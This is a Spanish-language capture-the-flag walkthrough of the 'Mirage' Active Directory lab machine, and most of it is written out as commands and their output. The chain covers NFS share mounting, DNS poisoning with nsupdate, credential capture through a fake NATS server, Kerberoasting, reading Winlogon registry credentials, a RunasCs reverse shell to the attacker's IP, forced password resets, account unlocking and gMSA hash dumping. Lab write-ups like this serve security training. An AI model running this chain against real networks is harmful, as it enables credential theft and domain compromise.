# Mirage

<img width="670" height="485" alt="image" src="https://github.com/user-attachments/assets/6b17f840-0367-46fe-ae69-84f2daeb1e15" />

# Reconocimiento Inicial

```bash
nmap -Pn -n -sT -p- --min-rate 5000 -oN nmap.txt 10.10.11.78
```
```bash
Nmap scan report for 10.10.11.78
Host is up (0.15s latency).
Not shown: 64981 closed tcp ports (conn-refused), 525 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
4222/tcp  open  vrml-multi-use
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
55155/tcp open  unknown
60964/tcp open  unknown
60973/tcp open  unknown
60974/tcp open  unknown
60987/tcp open  unknown
60992/tcp open  unknown
61013/tcp open  unknown
61030/tcp open  unknown
```

```bash
nmap -Pn -n -sT -p53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001,49665,49666,49667,49668,55155,60964,60973,60974,60987,60992,61013,61030 -sCV --min-rate 5000 10.10.11.78 -oN nmap_2.txt
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 10:23 -03
Nmap scan report for 10.10.11.78
Host is up (0.17s latency).

PORT      STATE SERVICE         VERSION
53/tcp    open  domain          Simple DNS Plus
88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2025-07-26 20:23:13Z)
111/tcp   open  rpcbind         2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc           Microsoft Windows RPC
139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
2049/tcp  open  nlockmgr        1-4 (RPC #100021)
3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
4222/tcp  open  vrml-multi-use?
| fingerprint-strings: 
|   GenericLines: 
|     INFO {"server_id":"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQMSGUZCEDVA","server_name":"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQMSGUZCEDVA","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":29,"client_ip":"10.10.14.128","xkey":"XCH43TCCFVPRALG4QPRAIL6ELWPIMVBCI4CHSBTD57HIEF3WYE3QPDJS"} 
|     -ERR 'Authorization Violation'
|   GetRequest: 
|     INFO {"server_id":"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQMSGUZCEDVA","server_name":"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQMSGUZCEDVA","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":30,"client_ip":"10.10.14.128","xkey":"XCH43TCCFVPRALG4QPRAIL6ELWPIMVBCI4CHSBTD57HIEF3WYE3QPDJS"} 
|     -ERR 'Authorization Violation'
|   HTTPOptions: 
|     INFO {"server_id":"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQMSGUZCEDVA","server_name":"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQMSGUZCEDVA","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":31,"client_ip":"10.10.14.128","xkey":"XCH43TCCFVPRALG4QPRAIL6ELWPIMVBCI4CHSBTD57HIEF3WYE3QPDJS"} 
|     -ERR 'Authorization Violation'
|   NULL: 
|     INFO {"server_id":"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQMSGUZCEDVA","server_name":"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQMSGUZCEDVA","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":28,"client_ip":"10.10.14.128","xkey":"XCH43TCCFVPRALG4QPRAIL6ELWPIMVBCI4CHSBTD57HIEF3WYE3QPDJS"} 
|_    -ERR 'Authentication Timeout'
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf          .NET Message Framing
47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc           Microsoft Windows RPC
49666/tcp open  msrpc           Microsoft Windows RPC
49667/tcp open  msrpc           Microsoft Windows RPC
49668/tcp open  msrpc           Microsoft Windows RPC
55155/tcp open  msrpc           Microsoft Windows RPC
60964/tcp open  msrpc           Microsoft Windows RPC
60973/tcp open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
60974/tcp open  msrpc           Microsoft Windows RPC
60987/tcp open  msrpc           Microsoft Windows RPC
60992/tcp open  msrpc           Microsoft Windows RPC
61013/tcp open  msrpc           Microsoft Windows RPC
61030/tcp open  msrpc           Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4222-TCP:V=7.95%I=7%D=7/26%Time=6884D6B8%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1D0,"INFO\x20{\"server_id\":\"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSR
SF:PSENVCWQMSGUZCEDVA\",\"server_name\":\"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7D
SF:B6OKSRPSENVCWQMSGUZCEDVA\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_c
SF:ommit\":\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"por
SF:t\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":104857
SF:6,\"jetstream\":true,\"client_id\":28,\"client_ip\":\"10\.10\.14\.128\"
SF:,\"xkey\":\"XCH43TCCFVPRALG4QPRAIL6ELWPIMVBCI4CHSBTD57HIEF3WYE3QPDJS\"}
SF:\x20\r\n-ERR\x20'Authentication\x20Timeout'\r\n")%r(GenericLines,1D1,"I
SF:NFO\x20{\"server_id\":\"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQM
SF:SGUZCEDVA\",\"server_name\":\"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSE
SF:NVCWQMSGUZCEDVA\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\
SF:"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,
SF:\"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetst
SF:ream\":true,\"client_id\":29,\"client_ip\":\"10\.10\.14\.128\",\"xkey\"
SF::\"XCH43TCCFVPRALG4QPRAIL6ELWPIMVBCI4CHSBTD57HIEF3WYE3QPDJS\"}\x20\r\n-
SF:ERR\x20'Authorization\x20Violation'\r\n")%r(GetRequest,1D1,"INFO\x20{\"
SF:server_id\":\"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQMSGUZCEDVA\
SF:",\"server_name\":\"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQMSGUZ
SF:CEDVA\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfda\"
SF:,\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"headers\
SF:":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":tru
SF:e,\"client_id\":30,\"client_ip\":\"10\.10\.14\.128\",\"xkey\":\"XCH43TC
SF:CFVPRALG4QPRAIL6ELWPIMVBCI4CHSBTD57HIEF3WYE3QPDJS\"}\x20\r\n-ERR\x20'Au
SF:thorization\x20Violation'\r\n")%r(HTTPOptions,1D1,"INFO\x20{\"server_id
SF:\":\"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQMSGUZCEDVA\",\"serve
SF:r_name\":\"NCELFT4Z6KOS2CLLUFQIF5SEONZNDK7DB6OKSRPSENVCWQMSGUZCEDVA\",\
SF:"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"go\":\
SF:"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"headers\":true,\"
SF:auth_required\":true,\"max_payload\":1048576,\"jetstream\":true,\"clien
SF:t_id\":31,\"client_ip\":\"10\.10\.14\.128\",\"xkey\":\"XCH43TCCFVPRALG4
SF:QPRAIL6ELWPIMVBCI4CHSBTD57HIEF3WYE3QPDJS\"}\x20\r\n-ERR\x20'Authorizati
SF:on\x20Violation'\r\n");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-26T20:24:11
|_  start_date: N/A
|_clock-skew: 7h00m04s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.25 seconds
```

# Configuraciones Iniciales

>>> Sincronizacion de reloj con el DC
>>> 
>>> Configuracion de /etc/hosts
>>> 
>>> Configuracion de /etc/krb5.conf

```bash
ntpdate mirage.htb # Sincronizacion de reloj con el DC
```

```bash
echo '10.10.11.78 DC01.mirage.htb DC01 mirage.htb' >> /etc/hosts # configurando /etc/hosts
```

```bash
sudo nano /etc/krb5.conf # configurando el cliente kerberos
```
```bash
[libdefaults]
    default_realm = MIRAGE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    MIRAGE.HTB = {
        kdc = DC01.mirage.htb
        admin_server = DC01.mirage.htb
    }

[domain_realm]
    .mirage.htb = MIRAGE.HTB
    mirage.htb = MIRAGE.HTB
```

# Fase de Enumeracion

Como vemos que el servidor tiene disponible el servicio `RPC` vamos a comenzar chequeando si existen recursos a los cuales poder acceder!!

```bash
showmount -e DC01
```

<img width="1920" height="129" alt="image" src="https://github.com/user-attachments/assets/c8f95553-0381-439f-8e31-cf495255030e" />


vemos el recurso compartido `/MirageReports` el cual esta disponible para todos `(everyone)` por lo que podemos montarnos en local el recurso y examinarlo

```bash
mkdir -p /mnt/MirageReports
```

```bash
mount -t nfs DC01:/MirageReports /mnt/MirageReports
```

<img width="1920" height="302" alt="image" src="https://github.com/user-attachments/assets/dc94e25d-8084-41e9-8f5c-10245207e112" />

ya montado lo examinamos y nos conseguimos con archivos `.pdf`

<img width="1920" height="225" alt="image" src="https://github.com/user-attachments/assets/8e33a5cf-d49c-4500-b6b0-4be8eec50ab4" />

ahora chequeamos que informacion tienen estos archivos

<img width="1920" height="971" alt="image" src="https://github.com/user-attachments/assets/9299cd6b-5718-49b5-b177-833c9ef7d8c2" />

por un lado vemos un informe para la migracion desde el protocolo `NTLM` a `Kerberos`

<img width="1920" height="971" alt="image" src="https://github.com/user-attachments/assets/84927b31-0273-4bbe-9800-919000cb9a98" />

en el segundo archivo `.pdf` vemos que se reporta que no esta disponible a nivel `dns` `nats-svc.mirage.htb`

Si leemos este ultimo informe se especifica que se permite actualizaciones dinámicas no seguras, asi que vamos a intentar registrar `nats-svc` bajo nuestra propia `ip`

### Actualizacion Dinamica DNS Maliciosa

```bash
nsupdate -d
```
```bash
> server 10.10.11.78
> update add nats-svc.mirage.htb 3600 A 10.10.14.128
> update add nats-svc.mirage.htb 3600 A 10.10.14.128
> send
Reply from SOA query:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id:  57639
;; flags: qr aa ra; QUESTION: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 2
;; QUESTION SECTION:
;nats-svc.mirage.htb.		IN	SOA

;; AUTHORITY SECTION:
mirage.htb.		3600	IN	SOA	dc01.mirage.htb. hostmaster.mirage.htb. 151 900 600 86400 3600

;; ADDITIONAL SECTION:
dc01.mirage.htb.	3600	IN	A	10.10.11.78
dc01.mirage.htb.	3600	IN	AAAA	dead:beef::a9c9:1d52:f379:764d

Found zone name: mirage.htb
The primary is: dc01.mirage.htb
Sending update to 10.10.11.78#53
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:   8385
;; flags:; ZONE: 1, PREREQ: 0, UPDATE: 1, ADDITIONAL: 0
;; UPDATE SECTION:
nats-svc.mirage.htb.	3600	IN	A	10.10.14.128


Reply from update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:   8385
;; flags: qr; ZONE: 1, PREREQ: 0, UPDATE: 1, ADDITIONAL: 0
;; ZONE SECTION:
;mirage.htb.			IN	SOA

;; UPDATE SECTION:
nats-svc.mirage.htb.	3600	IN	A	10.10.14.128
```

hemos logrado agregar exitosamente un registro `DNS` malicioso para `nats-svc.mirage.htb` apuntando a mi IP `(10.10.14.128).` Ahora el siguiente paso sera falsificar un `NATS`

### Falsificando un server NATS

Primero creamos un archivo de configuracion para el Server falso

```bash
nano config.conf
```
```bash
port: 4222
monitor_port: 8222
authorization {
  token: "token_falso"  # Token inventado (para forzar al cliente a enviar sus creds)
}
logtime: true
logfile: "nats.log"
debug: true
trace: true
```

ahora levantamos el servidor, pero si no tienes la herramienta instalada, desde kali la instalamos asi

```bash
sudo apt install nats-server
```

despues de la instalacion, levantamos el servidor falso

```bash
nats-server -c config.conf
```

por otro lado observamos en vivo y directo los logs

```bash
tail -f nats.log
```

y por ultimo vamos a tener que actualizar nuevamente el registro `DNS` como antes

<img width="1920" height="1053" alt="image" src="https://github.com/user-attachments/assets/e598e0b8-d29e-4be9-bd7b-ca2c19cbf7c0" />

una vez actualizado el registro `DNS` veremos lo siguiente

<img width="1920" height="1053" alt="image" src="https://github.com/user-attachments/assets/7e3a3674-8b30-4391-8337-e71745550926" />

aqui ya vemos que obtenemos un usuario `Dev_Account_A` pero la password observamos que no es posible verla `"pass":"[REDACTED]"` asi que usaremos `tcpdump` para intentar obtenerla al inspeccionar el trafico de red

```bash
tcpdump -i tun0 port 4222 -A -l | grep "pass"
```

luego volvemos actualizar el registro `DNS` y obtenemos la password en texto plano

<img width="1920" height="1053" alt="image" src="https://github.com/user-attachments/assets/832657d9-bdfd-47eb-85a9-bbbf5e5bf721" />

por lo que logramos obtener las credenciales `Dev_Account_A:hx5h7F5554fP@1337!`. Con las credenciales obtenidas las vamos a testear en el server original...
Primero agregamos `nats-svc.mirage.htb` a `/etc/hosts`

Luego nos descargamos e instalamos nats-cli

```bash
wget https://github.com/nats-io/natscli/releases/download/v0.2.4/nats-0.2.4-amd64.deb
```

lo instalamos

```bash
dpkg -i nats-0.2.4-amd64.deb
```

ahora testeamos las credenciales

```bash
nats sub ">" --server nats://nats-svc.mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
```

<img width="1920" height="943" alt="image" src="https://github.com/user-attachments/assets/a92ecdf0-b88d-48c6-9c01-c8b881e43a41" />

las credenciales son validas, y observamos un stream llamado `auth_logs` asi que el siguiente paso sea leer lo mensajes del stream `auth_logs`

>>> primero listamos los consumers que existen

```bash
nats consumer ls auth_logs --server nats://nats-svc.mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!
```

<img width="1920" height="254" alt="image" src="https://github.com/user-attachments/assets/436782e1-aa05-4e5c-9654-207c70620307" />

>>> ahora vamos a ver la informacion de los consumers
>>>
>>> Consumer audit-reader

```bash
nats consumer info auth_logs audit-reader --server nats://nats-svc.mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
```
```bash
Information for Consumer auth_logs > audit-reader created 2025-07-26 20:09:32

Configuration:

                    Name: audit-reader
               Pull Mode: true
          Filter Subject: logs.auth
          Deliver Policy: All
              Ack Policy: Explicit
                Ack Wait: 30.00s
           Replay Policy: Instant
         Max Ack Pending: 1,000
       Max Waiting Pulls: 512

State:

            Host Version: 2.11.3
      Required API Level: 0 hosted at level 1
  Last Delivered Message: Consumer sequence: 5 Stream sequence: 5 Last delivery: 49m20s ago
    Acknowledgment Floor: Consumer sequence: 5 Stream sequence: 5 Last Ack: 49m16s ago
        Outstanding Acks: 0 out of maximum 1,000
    Redelivered Messages: 0
    Unprocessed Messages: 0
           Waiting Pulls: 0 of maximum 512

```

>>> Consumer my-sniffer

```bash
nats consumer info auth_logs my-sniffer --server nats://nats-svc.mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
```
```bash
Information for Consumer auth_logs > my-sniffer created 2025-07-26 20:12:12

Configuration:

                    Name: my-sniffer
               Pull Mode: true
          Filter Subject: auth_logs
          Deliver Policy: All
              Ack Policy: All
                Ack Wait: 30.00s
           Replay Policy: Instant
         Max Ack Pending: 1,000
       Max Waiting Pulls: 512

State:

            Host Version: 2.11.3
      Required API Level: 0 hosted at level 1
  Last Delivered Message: Consumer sequence: 0 Stream sequence: 0
    Acknowledgment Floor: Consumer sequence: 0 Stream sequence: 0
        Outstanding Acks: 0 out of maximum 1,000
    Redelivered Messages: 0
    Unprocessed Messages: 0
           Waiting Pulls: 0 of maximum 512

```

>>> consumer test

```bash
nats consumer info auth_logs test --server nats://nats-svc.mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
```
```bash
Information for Consumer auth_logs > test created 2025-07-26 19:43:09

Configuration:

            Durable Name: test
               Pull Mode: true
          Deliver Policy: All
              Ack Policy: Explicit
                Ack Wait: 30.00s
           Replay Policy: Instant
         Max Ack Pending: 1,000
       Max Waiting Pulls: 512

State:

            Host Version: 2.11.3
      Required API Level: 0 hosted at level 1
  Last Delivered Message: Consumer sequence: 5 Stream sequence: 5 Last delivery: 1h19m13s ago
    Acknowledgment Floor: Consumer sequence: 5 Stream sequence: 5 Last Ack: 1h19m13s ago
        Outstanding Acks: 0 out of maximum 1,000
    Redelivered Messages: 0
    Unprocessed Messages: 0
           Waiting Pulls: 0 of maximum 512

```

como ya no existen mensajes pendientes por leer pero aun es posible leer lo mensajes ya leidos los haremos creando un nuevo `consumer` desde el inicio del stream

```bash
nats consumer add auth_logs darksblack --pull --filter "logs.auth" --deliver all --ack explicit --server nats://nats-svc.mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
```
hemos creado el consumer `darksblack`

 <img width="1920" height="635" alt="image" src="https://github.com/user-attachments/assets/99d7d667-9552-4412-be9f-3e0cfdf2bbcf" />

ahora leemos los mensajes

```bash
nats consumer next auth_logs darksblack --server nats://nats-svc.mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
```

<img width="1920" height="180" alt="image" src="https://github.com/user-attachments/assets/0d2efdb3-97e3-4250-8979-329d329918e6" />

pero si recordamos eran 5 mensajes y como ya leimos uno, vamos a leer los 4 restantes

```bash
nats consumer next auth_logs darksblack --count 4 --server nats://nats-svc.mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
```

<img width="1920" height="699" alt="image" src="https://github.com/user-attachments/assets/77319c2f-eebb-4640-952c-7f762d702c3c" />

bueno es el mismo mensaje, lo importante es que hemos obtenido credenciales nuevas!

>>> credenciales david.jjackson:pN8kQmn6b86!1234@

Ahora lo prmiero que probare sera `smb`

```bash
impacket-getTGT mirage.htb/'david.jjackson':'pN8kQmn6b86!1234@' # solicitamos el ticket kerberos
```
```bash
export KRB5CCNAME=david.jjackson.ccache
```
```bash
nxc smb DC01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' --shares -k
```

<img width="1920" height="469" alt="image" src="https://github.com/user-attachments/assets/54ed2a88-0887-42b4-a312-15a0ee9b4086" />

testeamos `ldap`

```bash
nxc ldap DC01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k
```

<img width="1920" height="469" alt="image" src="https://github.com/user-attachments/assets/db67a21b-e535-4bce-bdd2-60f30f2b8d18" />

vemos que funciona correctamente, ahora vamos a buscar usuarios que lleguen a ser vulnerables a `Kerberoasting`

```bash
impacket-GetUserSPNs mirage.htb/david.jjackson -no-pass -k -dc-host DC01.mirage.htb -request -outputfile hashes.txt
```

<img width="1920" height="217" alt="image" src="https://github.com/user-attachments/assets/15b007c4-2379-42ac-b084-116bd0f12994" />

conseguimos un usuario vulnerable asi que procedemos a intentar crackear el hash obtenido

```bash
hashcat --identify hashes.txt
```

<img width="1920" height="192" alt="image" src="https://github.com/user-attachments/assets/8f8d1b01-2bcf-47cd-8008-d6c93639d208" />

```bash
hashcat -m 13100 -a 0 -w 4 -d 1 hashes.txt /usr/share/wordlists/rockyou.txt
```

<img width="1920" height="969" alt="image" src="https://github.com/user-attachments/assets/9667ac03-c1b9-4a00-b760-8138d543b2a8" />

obtenemos la password del usuario `nathan.aadam`

>>> credenciales nathan.aadam:3edc#EDC3

ahora solicitamos un ticket kerberos para este usuario

```bash
kinit nathan.aadam@MIRAGE.HTB # ingresamos la password cuando la solicite
```

ahora recolectamos informacion con `bloodhound-python`

```bash
bloodhound-python -u 'nathan.aadam' -p '3edc#EDC3' -k -d mirage.htb -ns 10.10.11.78 -c ALl --zip
```

<img width="1920" height="448" alt="image" src="https://github.com/user-attachments/assets/630e6ea1-013e-46d9-ad63-bd95866def05" />

lo exportamos a `bloodhound`

<img width="1920" height="970" alt="image" src="https://github.com/user-attachments/assets/ec18b970-0f38-42cc-a210-ba4460bca620" />

como se observa en el grafico, este usuario pertenece al grupo `REMOTE MANAGEMENT` por lo que podemos acceder via `WinRm`

```bash
evil-winrm -i DC01.mirage.htb -k -u nathan.aadam -r MIRAGE.HTB
```

<img width="1920" height="449" alt="image" src="https://github.com/user-attachments/assets/2eab34b4-ad26-443b-ab4f-dd5408eed915" />


Despues de un rato buscando en el sistema, si revisamos el registro `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` obtenemos credenciales de un nuevo usuario

>>> Registro {HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon} : almacena configuraciones relacionadas con el proceso de inicio de sesión interactivo, es un registro muy importante debido a que si el sistema esta configurado para el inicio de sesión automático, aqui en este registro se almacenan las credenciales en texto plano



```powershell
PS C:\Users\nathan.aadam\Documents> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```


<img width="1920" height="900" alt="image" src="https://github.com/user-attachments/assets/4e520c9d-91c5-4f03-8c40-1b831f595430" />

como no es posible acceder via `WinRm` con este usuario haremos uso de `RunasCs.exe` para establecer una shell, primero la cargamos y luego lanzamos la shell

```bash
nc -lnvp 5555 # esperamos la revershell en nuestra maquina
```
```powershell
./RunasCs.exe mark.bbond 1day@atime powershell -r 10.10.14.128:5555 # envio la shell como el nuevo usuario
```

<img width="1920" height="709" alt="image" src="https://github.com/user-attachments/assets/1a59d7cd-3a7a-4014-a1cf-d06502f64106" />

obtenemos acceso como el usuario `mark.bbond`, ahora vamos a chequear en `bloodhound`

<img width="1920" height="965" alt="image" src="https://github.com/user-attachments/assets/b795cc98-40b5-4c95-96bc-b2b025b18ae5" />

podemos cambiar la password del usuario `javier.mmarshall` asi que ejecutamos:

```powershell
bloodyAD -k --host DC01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' set password JAVIER.MMARSHALL 'P4ssw0rd!' #cambio de password!
```

logramos cambiar la password del usuario pero igual no podemos hacer uso de ella por lo que solicitamos informacion de la cuenta

```bash
bloodyAD --kerberos -u "mark.bbond" -p '1day@atime' -d "mirage.htb" --host "dc01.mirage.htb" get object "javier.mmarshall" --attr userAccountControl
```
```bash
distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

la cuenta aparece como Desactivada, asi que la activamos (todo como el usuario mark.bbond)

```powershell
Enable-ADAccount -Identity javier.mmarshall
```

si consultamos nuevamente informacion veremos que esta activa

```powershell
Get-ADUser -Identity javier.mmarshall
```

<img width="1920" height="321" alt="image" src="https://github.com/user-attachments/assets/80a80735-ae12-4a1c-b714-5b37c3740e7c" />

Pero aun asi no es posible hacer uso de la cuenta ya que cuanto intentamos lanzar una shell con `RunasCs.exe` nos dice:

>>> [-] RunasCsException: LogonUser failed with error code: Your account has time restrictions that keep you from signing in right nowP

<img width="1920" height="173" alt="image" src="https://github.com/user-attachments/assets/4bc1414a-ba5a-4d48-9284-40f4777e6e8a" />

Esto quiere decir que la cuenta tiene una restriccion horaria, por lo que ahora debemos quitar estar restriccion para poder autenticarnos con ella!!!

### Eliminando restriccion horaria

```powershell
$user = [ADSI]"LDAP://CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb"
```

```powershell
$logonHours = [byte[]](0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF)
```

```powershell
$user.Put("logonHours", $logonHours)
```

```powershell
$user.SetInfo()
```

por ultimo consultamos los cambios

```powershell
Get-ADUser -Identity javier.mmarshall -Properties LogonHours | Select-Object -ExpandProperty LogonHours
```
<img width="1920" height="686" alt="image" src="https://github.com/user-attachments/assets/1c4fbf5e-b389-4521-a752-5feebe8a50ff" />

ahora podemos solicitar el ticket kerberos

```bash
impacket-getTGT mirage.htb/javier.mmarshall:'P4ssw0rd!'
```

```bash
export KRB5CCNAME=javier.mmarshall.ccache
```

continuando con las instrucciones de Bloodhound, vamos a extraer el hash `NTLM` del usuario `MIRAGE-SERVICE$`. Primero nos descargamos el script python

```bash
wget https://raw.githubusercontent.com/micahvandeusen/gMSADumper/refs/heads/main/gMSADumper.py
```
ejecutamos el script 

```bash
python3 gMSADumper.py -d mirage.htb -k
```

<img width="1920" height="224" alt="image" src="https://github.com/user-attachments/assets/88b1cfbe-2df5-4be0-ae12-8be6878907fc" />


obtenemos el hash `NTML` asi que podemos solicitar el ticket kerberos para esta cuenta

```bash
impacket-getTGT mirage.htb/'Mirage-Service$' -hashes :305806d84f7c1be93a07aaf40f0c7866
```

<img width="1920" height="169" alt="image" src="https://github.com/user-attachments/assets/504ff88c-5b0e-41d8-8e59-fe26d735bbac" />











